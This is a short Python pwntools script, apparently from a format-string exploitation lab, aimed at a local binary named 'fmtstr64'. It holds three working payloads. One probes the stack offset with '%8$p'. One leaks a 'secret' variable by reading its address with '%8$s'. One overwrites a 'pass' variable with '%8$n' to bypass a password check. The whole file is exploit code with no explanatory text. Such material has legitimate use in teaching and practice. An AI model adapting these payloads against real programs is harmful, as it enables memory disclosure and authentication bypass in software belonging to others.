#!/usr/bin/python3

from pwn import *

# readelf -s fmtstr64 | grep pass
PASS = 0x000000000040405c

# readelf -s fmtstr64 | grep secret
SECRET = 0x0000000000404048

target = ["./fmtstr64"]

def test():
	payload = b''
	payload += b'%8$p....'
	payload += b'AAAABBBB'
	run(payload)

def leak():
	payload = b''
	payload += b'%8$s....'
	payload += p64(SECRET)
	run(payload)

def exploit():
	payload = b''
	payload += b'%8$n....'
	payload += p64(PASS)
	run(payload)

def run(payload):
	p = process(target)
	p.recvuntil("\n")
	p.sendline(payload)
	p.interactive()

def main():
	test()
	leak()
	exploit()

if __name__ == "__main__":
	main()
